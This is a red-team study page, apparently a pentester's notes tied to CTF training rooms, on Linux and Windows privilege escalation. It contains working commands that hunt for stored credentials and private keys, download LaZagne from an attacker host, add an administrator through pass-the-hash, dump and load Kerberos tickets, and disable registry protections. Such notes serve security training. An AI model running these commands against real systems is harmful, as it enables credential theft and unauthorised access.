# Red Team - Fourth step - Privilege Escalation

[![operatingsystemsecurity](../../_badges/thmp/operatingsystemsecurity.svg)](https://tryhackme.com/room/operatingsystemsecurity)
[![adventofcyber2](../../_badges/thm/adventofcyber2/day11.svg)](https://tryhackme.com/room/adventofcyber2)

<div class="row row-cols-lg-2"><div>

Privilege Escalation 🔑 is the fourth step of the pentester activities. We attempt to escalate from a regular user to an administrative account by exploiting a vulnerability in the system.

This is an important step otherwise we may not have enough privilege to access data, leave a backdoor, or for most [post-exploitation](../s5.post-exploitation/index.md) tasks.

We want to access account with the higher level of privileges:

* `root` > `sudoers` > [...] on [Linux](/operating-systems/linux/_knowledge/index.md#sudo)
* `NT AUTHORITY\SYSTEM` > `Administrator` > [...] on [Windows](/operating-systems/windows/_knowledge/index.md#permissions-and-users)
</div><div>

Escalation can be **horizontally**/laterally <small>(another user with the same level of privileges)</small> and **vertically** <small>(a higher level of privileges)</small>.

**Learn** 🎓

* [Ignitetechnologies/Privilege-Escalation](https://github.com/Ignitetechnologies/Privilege-Escalation) <small>(3.1k ⭐, CTFs)</small>

**Tools**

* [Meterpreter](/cybersecurity/red-team/tools/frameworks/metasploit/index.md#meterpreter) (scripts for Linux/Windows)
</div></div>

<hr class="sep-both">

## Privilege Escalation Basics

[![linuxprivilegeescalation](../../_badges/htb/linuxprivilegeescalation.svg)](https://academy.hackthebox.com/course/preview/linux-privilege-escalation)
[![windows_privilege_escalation](../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)
[![linprivesc](../../_badges/thm/linprivesc.svg)](https://tryhackme.com/room/linprivesc)
[![commonlinuxprivesc](../../_badges/thmp/commonlinuxprivesc.svg)](https://tryhackme.com/room/commonlinuxprivesc)
[![commonlinuxprivesc](../../_badges/thmp/commonlinuxprivesc.svg)](https://tryhackme.com/room/commonlinuxprivesc)
[![adventofcyber2](../../_badges/thm/adventofcyber2/day11.svg)](https://tryhackme.com/room/adventofcyber2)
[![windowsprivesc20](../../_badges/thmp/windowsprivesc20.svg)](https://tryhackme.com/room/windowsprivesc20)

<div class="row row-cols-lg-2"><div>

Each operating system has its own set of escalation vectors while they share similarities. The most common point is that we want to gather information about the environnement.

* **User information** 🧑: it may be used to determine your level of access, your role, along with username naming conventions

* **Host information** 💻: it may be used to find if there are well-known vulnerabilities or misconfigurations.

* **Network information** 🌍: from the outside, we mostly only saw a portion of the internal network. We find find that the host is running a FTP server only available from the inside. It's also interesting to see the ARP cache and the routing tables.

Additionally, look for folders where you can download and run scripts, along with the machine configuration to configure them properly. 
</div><div>

I compiled a list of handy commands per operating system:

* [Linux Environment Identification](linux/utils/id.md)
* [Windows Environment Identification](windows/utils/id.md)

You will also have to look for installed tools and apps along with their versions. You will need this information to look for [CVEs and exploits](/cybersecurity/red-team/s3.exploitation/index.md#vulnerability-databases) related to local escalation privilege.
</div></div>

<hr class="sep-both">

## Linux privilege escalation 🦆

[![linuxprivilegeescalation](../../_badges/htb/linuxprivilegeescalation.svg)](https://academy.hackthebox.com/course/preview/linux-privilege-escalation)
[![linprivesc](../../_badges/thm/linprivesc.svg)](https://tryhackme.com/room/linprivesc)
[![commonlinuxprivesc](../../_badges/thmp/commonlinuxprivesc.svg)](https://tryhackme.com/room/commonlinuxprivesc)
[![commonlinuxprivesc](../../_badges/thmp/commonlinuxprivesc.svg)](https://tryhackme.com/room/commonlinuxprivesc)
[![adventofcyber2](../../_badges/thm/adventofcyber2/day11.svg)](https://tryhackme.com/room/adventofcyber2)
[![linux_privilege_escalation](../../_badges/poat/linux_privilege_escalation.svg)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

<div class="row row-cols-lg-2"><div>

[Linux](/operating-systems/linux/_knowledge/index.md) privilege escalation may be achieved by exploiting:

* 💎 Exploiting [sudo](linux/topics/sudo.md)
* ⏰ Exploiting [scheduled tasks](linux/topics/tasks.md) <small>(cron tasks)</small>
* 🔑 Finding [credentials/files](#credential-hunting) <small>(config, logs, ssh keys...)</small>
* 💥 Exploiting the [kernel](linux/topics/kernel.md)
* 🐸 Misconfigured [file permissions](linux/topics/perms.md)
* 📦 Look for [unmounted drives/medias](linux/topics/drives.md)
* 👻 Look for printers (`lpstat`)

External tools/services

* 🎠 Misconfigured [NFS shares](/operating-systems/networking/protocols/nfs.md#nfs-vulnerabilities-)
* 🎠 Misconfigured [Docker socket/permissions](/operating-systems/others/containers/docker/index.md#docker-pentester-notes-)
* 🎠 Misconfigured [LXC/LXD permissions](/operating-systems/others/containers/lxc/index.md#pentester-notes-)
* 🎠 Misconfigured [Tmux sessions](/operating-systems/linux/env/others/tmux/index.md)

⚠️ Don't forget hidden files. [Compiled Recipe](linux/recipe.md).
</div><div>

There are many **automated scripts** that will investigate usual places, services, files... that you may want to look at. You will still have to understand the output, dig into it...

* [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) <small>(14.6k ⭐ | shell script)</small>
* [LinEnum](https://github.com/rebootuser/LinEnum) <small>(6.6k ⭐ | shell script | 2020 🪦)</small>
* [traitor](linux/tools/traitor.md)  <small>(6.5k ⭐ | go script compiled to binary | 2022 ☠️)</small>
* [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration) a.k.a. LSE <small>(3.0k ⭐ | shell script)</small>
* [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker) <small>(1.5k ⭐ | python script, 2021 🪦)</small>
* [pwncat-cs](/cybersecurity/red-team/s3.exploitation/shell/tools/pwncat.md) <small>(2.3k ⭐ | reverse shell with priv. esc. suggester | 2022 ☠️)</small>

Additional references

* [GTFOBins](linux/tools/gtfobins.md)
* [Injection](linux/utils/injection.md)
* [Rootbash](linux/utils/rootbash.md)
* [Restricted Shells](linux/random/restricted_shells.md)

<details class="details-n">
<summary>Special escalation vectors</summary>

[![ctf](../../_badges/thm-p/ctf.svg)](https://tryhackme.com/room/ctf)

* The SSH banner (`/etc/update-motd.d/00-header`), which is executed as root, is using a script that we could edit.
</details>
</div></div>

<hr class="sep-both">

## Windows privilege escalation 🪟

[![windows_privilege_escalation](../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)
[![adventofcyber2](../../_badges/thm/adventofcyber2/day12.svg)](https://tryhackme.com/room/adventofcyber2)
[![windowsprivesc20](../../_badges/thmp/windowsprivesc20.svg)](https://tryhackme.com/room/windowsprivesc20)
[![windows_privilege_escalation](../../_badges/poat/windows_privilege_escalation.svg)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

<div class="row row-cols-lg-2"><div>

[Windows](/operating-systems/windows/_knowledge/index.md) privilege escalation may be achieved by exploiting:

* 💎 Exploiting [UAC](windows/topics/uac.md)
* ⏰ Exploiting [scheduled tasks](windows/topics/tasks.md)
* 🔑 Finding [credentials](#credential-hunting) <small>(config, logs, passwords...)</small>
* 💥 Exploiting [services](windows/topics/services.md) and [named pipes](windows/topics/named_pipes.md)
* 🐸 Exploiting [privileges](windows/topics/privs.md) <small>(including groups and ACEs)</small>
* 📦 Unpatched [vulnerabilities](windows/topics/vulns.md) 

<br>

Additional references

* [LOLBAS](https://lolbas-project.github.io/#) <small>(6.3k ⭐)</small> 
* [hijacklibs](https://hijacklibs.net/) <small>(0.5k ⭐)</small>
* [frizb](https://github.com/frizb/Windows-Privilege-Escalation) <small>(0.7k ⭐, checklist, 2020 🪦)</small>
* [Ghostpack-CompiledBinaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries) <small>(1.0k ⭐, 2022 🪦)</small>
* [SharpCollection](https://github.com/Flangvik/SharpCollection) <small>(2.1k ⭐, compiled C# projects)</small>
</div><div>

There are many **automated scripts** that will investigate usual places, services, files... that you may want to look at. You will still have to understand the output, dig into it...

* [WinPeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) <small>(14.6k ⭐ | binary | Download and Run `.\winPEASany_ofs.exe`)</small>
* [Seatbelt](https://github.com/GhostPack/Seatbelt) <small>(3.4k ⭐)</small>
* [PrivescCheck](https://github.com/itm4n/PrivescCheck) <small>(2.5k ⭐ | powershell script)</small>
* [JAWS](https://github.com/411Hall/JAWS) <small>(1.5k ⭐ | 2020 🪦)</small>
* [SharpUp](https://github.com/GhostPack/SharpUp) <small>(1.1k ⭐ | C# port of PowerUp)</small>
* [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) <small>(11.2k ⭐ | powershell script | 2017 🪦 | This is the latest version of [PowerTools](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp) and [PowerUp](https://github.com/HarmJ0y/PowerUp) which are dead too since 2014/2015)</small>.

```ps
PS> powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
PS> powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
```
</div></div>

<hr class="sep-both">

## Credential Hunting

[![password_attacks](../../_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
[![windows_privilege_escalation](../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)
[![linuxprivilegeescalation](../../_badges/htb/linuxprivilegeescalation.svg)](https://academy.hackthebox.com/course/preview/linux-privilege-escalation)
[![adventofcyber2](../../_badges/thm/adventofcyber2/day24.svg)](https://tryhackme.com/room/adventofcyber2)
[![linuxprivesc](../../_badges/thm/linuxprivesc.svg)](https://tryhackme.com/room/linuxprivesc)
[![windowsprivesc20](../../_badges/thmp/windowsprivesc20.svg)](https://tryhackme.com/room/windowsprivesc20)
[![breachingad](../../_badges/thm/breachingad.svg)](https://tryhackme.com/r/room/breachingad)

<div class="row row-cols-lg-2"><div>

You may try to look for credentials. **Try password/key reuse**.

* 🔑 Password, Passphrases
* 🎫 Tickets <small>(ex: Kerberos)</small>, Tokens <small>(ex: GIT)</small>, Keys <small>(ex: SSH)</small>

Common places to dig for credentials are:

* 🔐 command history <small>(ex: ~/.bash_history, \*hist\*)</small>
* 🌍 browser [history, saved passwords, etc.](others/browser.md)
* 🛣️ application <small>(.ppk, .rdp, .sdtid)</small> and system [logs](/cybersecurity/blue-team/topics/logs.md) <small>(/var/log/)</small>
* 🐚 backups <small>(.old, .bak, xxx~...)</small>
* ✉️ conversations/mails <small>(/var/mail/)</small>
* 🌳 configurations <small>(.env, .ini/.config/.cfg/.conf/.cnf, .sql)</small>
* 🤖 scripts and tasks <small>(.sh/.ps1/.bat, cronjob)</small>
* 👜 check the registry <small>(Windows, privilege required)</small>
* 💎 Databases <small>(.\*db\*)</small>, Password Managers, [Files](https://fileinfo.com/filetypes/encoded)
* ...

Manually dig for interesting or unexpected files

* `/`: look for unexpected folders in `/`
* `/root/`: test if administrator home is readable
* `~/Desktop`: look for documents, passwords...
* `~/Documents`: look for documents, passwords...
* `%appdata%`: look for sensitive applications data

Always put yourself in the target shoes.

#### Automated Tools To Find Credentials

[![password_attacks](../../_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
[![windows_privilege_escalation](../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)

You can use [LaZagne](https://github.com/AlessandroZ/LaZagne) <small>(9.0k ⭐)</small>.

```ps
PS> wget IP:port/LaZagne.exe -UseBasicParsing -O LaZagne.exe
PS> .\LaZagne.exe all
```

You can use [Snaffler](https://github.com/SnaffCon/Snaffler) <small>(1.8k ⭐)</small> to find juicy files on your host and every available share on the network.

```ps
PS> Snaffler.exe -s -d domain -o snaffler.log -v data
<#press enter multiples times if stdout stuck#>
```

You can use [SessionGopher](https://github.com/Arvanaghi/SessionGopher) <small>(1.1k ⭐, 2018 🪦)</small>.

```ps
PS> Import-Module .\SessionGopher.ps1
```

You can use [MailSniper](https://github.com/dafthack/MailSniper) <small>(2.8k ⭐, 2022 🪦)</small> for automated scans of sensitive information in a Microsoft Exchange environment.

You can use [truffleHog](https://github.com/trufflesecurity/truffleHog) <small>(13.7k ⭐, 2022 🪦)</small> for GIT repositories.

#### Linux CredHunting Notes

[![password_attacks](../../_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
[![linuxprivilegeescalation](../../_badges/htb/linuxprivilegeescalation.svg)](https://academy.hackthebox.com/course/preview/linux-privilege-escalation)
[![linuxprivesc](../../_badges/thm/linuxprivesc.svg)](https://tryhackme.com/room/linuxprivesc)
[![ignite](../../_badges/thm-p/ignite.svg)](https://tryhackme.com/room/ignite)
[![chillhack](../../_badges/thm-p/chillhack.svg)](https://tryhackme.com/room/chillhack)
[![techsupp0rt1](../../_badges/thm-p/techsupp0rt1.svg)](https://tryhackme.com/r/room/techsupp0rt1)
[![validation](../../_badges/htb-p/validation.svg)](https://app.hackthebox.com/machines/Validation)

You often find interesting files in easy CTFs using:

```shell!
$ find / -user $(whoami) -type f 2>/dev/null | grep -v /proc | grep -v /sys
$ find / -type f -writable 2>/dev/null | grep -v /proc | grep -v /sys
```

Find credentials, keys, tokens, passwords:

```ps
$ find / -name .ssh 2> /dev/null
$ find / -name *id_rsa* 2> /dev/null
$ grep -rnw "PRIVATE KEY" / 2>/dev/null | grep ":1" # private keys
$ grep -rnw "ssh-rsa" / 2>/dev/null | grep ":1"     # public keys
$ find / -wholename "*.git/config" 2> /dev/null | xargs grep "url"
```

🔐 As root, check Linux password history file: `/etc/security/opasswd`.
</div><div>

#### Windows CredHunting Notes

[![password_attacks](../../_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
[![windows_privilege_escalation](../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)
[![windowsprivesc20](../../_badges/thmp/windowsprivesc20.svg)](https://tryhackme.com/room/windowsprivesc20)
[![breachingad](../../_badges/thm/breachingad.svg)](https://tryhackme.com/r/room/breachingad)
[![attacktivedirectory](../../_badges/thm-p/attacktivedirectory.svg)](https://tryhackme.com/r/room/attacktivedirectory)
[![anthem](../../_badges/thm-p/anthem.svg)](https://tryhackme.com/r/room/anthem)

Read PowerShell console history:

```shell!
PS> gc (Get-PSReadLineOption).HistorySavePath
PS> type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
CMD> type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

List saved credentials by Windows:

```shell!
PS> cmdkey /list
PS> # use 'admin' saved credentials to start cmd.exe
PS> runas /savecred /user:admin cmd.exe
PS> runas /savecred /user:admin "COMMAND HERE"
```

Some known locations:

```powershell
# Internet Information Services (IIS) = the default web server
PS> type C:\inetpub\wwwroot\web.config | findstr connectionString
PS> type C:\Windows\Microsoft.NET\Framework64\vX.X.XXXXX\Config\web.config | findstr connectionString
# Windows Deployment Services (credentials of the admin that
# deployed the OS image to several hosts, referred as "Unattended")
PS> type C:\Unattend.xml
PS> type C:\Windows\Panther\Unattend.xml
PS> type C:\Windows\Panther\Unattend\Unattend.xml
PS> type C:\Windows\system32\sysprep.inf
PS> type C:\Windows\system32\sysprep\sysprep.xml
# VNC servers
# FileZilla
PS> type C:\xampp\FileZilla Server\FileZilla Server.xml
PS> type C:\Program Files\FileZilla Server\FileZilla Server.xml
```

Some known registry keys/hives:

```ps
# Putty
PS> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
PS> reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
# Windows Autologon - Cleartext credentials
PS> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

Visualize saved WI-FI network passwords:

```ps
PS> netsh wlan show profile
PS> netsh wlan show profile <profile_name> key=clear
```

Some users may store sensitive data in sticky notes [database](/programming-languages/databases/relational/dbms/sqlite.md):

```ps
PS> ls $Env:localappdata/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite
```

Manually look for sensitive files:

```shell!
CMD> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
CMD> where /R C:\ *.txt *.ini *.cfg *.config *.xml
CMD> dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
PS> Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```

Dig centrally deployed application:

* [McAfee Credentials](others/apps/mcafee.md)

📚 See also: [PowerShell Secure String](/operating-systems/windows/security/index.md#powershell-securestring) for encrypted passwords.

📚 Remember to look inside network shares too.
</div></div>

<hr class="sep-both">

## Pass-the-xxx

<div class="row row-cols-lg-2"><div>

#### Pass-the-hash (pth)

[![password_attacks](../../_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
[![attacking_common_services](../../_badges/htb/attacking_common_services.svg)](https://academy.hackthebox.com/course/preview/attacking-common-services)
[![attacktivedirectory](../../_badges/thm-p/attacktivedirectory.svg)](https://tryhackme.com/r/room/attacktivedirectory)

There are some scenarios in which we got hold of a hash, but haven't managed to crack it. We may try to use the hash.

Legacy systems using NTLM instead of Kerberos <small>(or alternatives)</small> may be vulnerable as hashes are not salted and may be reused.

* Protocol-specific tools (examples)

```shell!
$ evil-winrm -i IP -u username -H "hash" # WinRM protocol
$ impacket-psexec -hashes :hash username@IP
$ nxc smb IP/32 -u username -d . -H hash
$ xfreerdp  /v:IP /u:username /pth:hash
```

⚠️ Remote Local Administrator pth is not possible by default. You need to disable DisableRestrictedAdmin, for instance, using: `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f` <small>(registry permission required)</small>.

* We can use the popular [Mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md) tool on Windows.

* We can use [linikatz](https://github.com/CiscoCXSecurity/linikatz) <small>(0.5k ⭐)</small> on a Linux target

* We can use the [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) <small>(1.4k ⭐, 2018 🪦)</small> script suite on Windows. We can use it to create a user on the target, if we have admin access onto the target. Otherwise, pop a reverse shell.

```shell!
PS> Import-Module .\Invoke-TheHash.psd1
PS> Invoke-SMBExec -Target IP -Domain xxx -Username xxx -Hash xxx -Command "net user xxx Password123 /add && net localgroup administrators xxx /add" -Verbose
PS> Invoke-WMIExec -Target DC01 -Domain xxx.xxx -Username xxx -Hash xxx -Command "cmd.exe"
```

⚠️ We cannot remotely access a local administrator account by default. If `FilterAdministratorToken` is disabled, you can set  `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` to 1 to bypass this check.
</div><div>

#### Pass-the-ticket (ptt)

[![password_attacks](../../_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)

Some authentication mechanisms such as [Kerberos](/operating-systems/cloud/active-directory/security/index.md#kerberos) are based on tickets to authorize access to resources. Given a ticket that hasn't expired, we may be able to access interesting resources.

On Windows, an user can only access their tickets, while an admin can access every ticket on the computer.

* We can use the popular [Mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md) tool on Windows.

```shell!
mimikatz# sekurlsa::tickets /export # dump tickets
CMD> dir *.kirbi # @krbtgt == TGT
mimikatz# kerberos::ptt ".\xxx@yyy.kirbi" # load ticket
```

* We can use [linikatz](https://github.com/CiscoCXSecurity/linikatz) <small>(0.5k ⭐)</small> on Linux

* We can use [mimipenguin](https://github.com/huntergregal/mimipenguin) <small>(3.7k ⭐, 2022 🪦)</small> on Linux

* We can use [Rubeus](/cybersecurity/red-team/tools/utilities/creds/rubeus.md)

```shell!
PS> .\Rubeus.exe dump /nowrap # Dump tickets
PS> # Load the ticket in the current session
PS> .\Rubeus.exe asktgt /domain:xxx /user:xxx /rc4:xxx /ptt
PS> .\Rubeus.exe ptt /ticket:xxx@yyy.kirbi
PS> .\Rubeus.exe ptt /ticket:<the base64 encoded ticket>
PS> # Pass the Key / OverPass the Hash == create a ticket
PS> .\Rubeus.exe asktgt /domain:xxx /user:xxx /aes256:xxx /nowrap
PS> .\Rubeus.exe asktgt /domain:xxx /user:xxx /rc4:xxx /nowrap
```

**What's next? 🐼** According to the ticket that was loaded, you may be able to run commands that you couldn't before. For instance:

```shell!
PS> dir \\DC01.xxx.yyy\c$
PS> dir \\DC01.xxx.yyy\some_user_share
PS> dir \\DC01\some_user_share
PS> Enter-PSSession -ComputerName DC01
```
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

Courses

* [payatu.com](https://payatu.com/guide-linux-privilege-escalation)
* [udemy.com](https://www.udemy.com/course/linux-privilege-escalation/)

Cheatsheet

* [basic-linux-privilege-escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
* [Windows Privilege Escalation Fundamentals](https://fuzzysecurity.com/tutorials/16.html)
* [Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)

Random

* [WADComs](https://github.com/WADComs/WADComs.github.io) (1k ⭐)/[wadcoms website](https://wadcoms.github.io/)
* Metasploit PRO
* Create custom modules, `-m` or `loadpath` to load them, [doc](https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf)
* Test cracked credentials on any user
</div><div>

XXX

* If AppLocker is in use, try alternative paths or alternative executables such as `PowerShell_ISE.exe` for powershell
* Powershell downgrade attack (`powershell.exe -version 2 ; Get-host`) if multiple versions are present. Powershell V2 doesn't support event logging.

Exploiting Services

* [MySQL user-defined functions](https://redteamnation.com/mysql-user-defined-functions/)
* [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
</div></div>